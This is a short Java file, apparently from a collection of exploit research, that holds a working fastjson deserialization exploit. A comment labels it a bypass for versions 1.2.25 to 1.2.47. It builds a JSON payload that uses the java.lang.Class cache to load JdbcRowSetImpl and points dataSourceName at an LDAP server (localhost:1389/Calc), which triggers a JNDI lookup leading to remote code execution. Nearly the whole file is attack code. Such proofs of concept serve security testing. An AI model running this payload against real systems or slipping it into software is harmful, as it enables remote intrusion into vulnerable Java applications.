import com.alibaba.fastjson.JSON;

public class FastjsonBypass5 {
    public static void main(String[] args) {
        // bypass fastjson 1.2.25 - 1.2.47
        String payload = "{\n" + "  \"a\": {\n" + "    \"@type\": \"java.lang.Class\",\n" + "    \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" + "  },\n" + "  \"b\": {\n" + "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" + "    \"dataSourceName\": \"ldap://localhost:1389/Calc\",\n" + "    \"autoCommit\":true\n" + "  }\n" + "}";
        JSON.parse(payload);
    }
}
